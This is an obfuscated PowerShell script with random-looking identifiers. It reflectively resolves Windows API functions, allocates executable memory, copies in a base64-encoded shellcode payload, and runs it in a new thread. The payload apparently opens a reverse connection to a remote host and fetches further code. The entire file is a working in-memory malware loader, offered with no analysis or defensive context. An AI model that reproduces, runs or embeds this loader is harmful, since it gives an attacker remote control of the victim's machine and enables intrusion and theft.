function knuMI2 {
	Param ($iGOOxxJ, $fOz_UpUG7Y)		
	$q2LL = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $q2LL.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($q2LL.GetMethod('GetModuleHandle')).Invoke($null, @($iGOOxxJ)))), $fOz_UpUG7Y))
}

function yIAKJnb6atdC {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $w1vnVQZxQB,
		[Parameter(Position = 1)] [Type] $m8LxU3CTw = [Void]
	)
	
	$wD8EgIxidF = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$wD8EgIxidF.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $w1vnVQZxQB).SetImplementationFlags('Runtime, Managed')
	$wD8EgIxidF.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $m8LxU3CTw, $w1vnVQZxQB).SetImplementationFlags('Runtime, Managed')
	
	return $wD8EgIxidF.CreateType()
}

[Byte[]]$cOoHed3e67 = [System.Convert]::FromBase64String("/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVorBgOc2gCABFcieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8O74B0qCmimlb2d/9U8BnwKgPvgdQW7RxNyb2oAU//V")
		
$lyHLBT2hzZ = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((knuMI2 kernel32.dll VirtualAlloc), (yIAKJnb6atdC @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $cOoHed3e67.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($cOoHed3e67, 0, $lyHLBT2hzZ, $cOoHed3e67.length)

$poZcWaWa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((knuMI2 kernel32.dll CreateThread), (yIAKJnb6atdC @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lyHLBT2hzZ,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((knuMI2 kernel32.dll WaitForSingleObject), (yIAKJnb6atdC @([IntPtr], [Int32]))).Invoke($poZcWaWa,0xffffffff) | Out-Null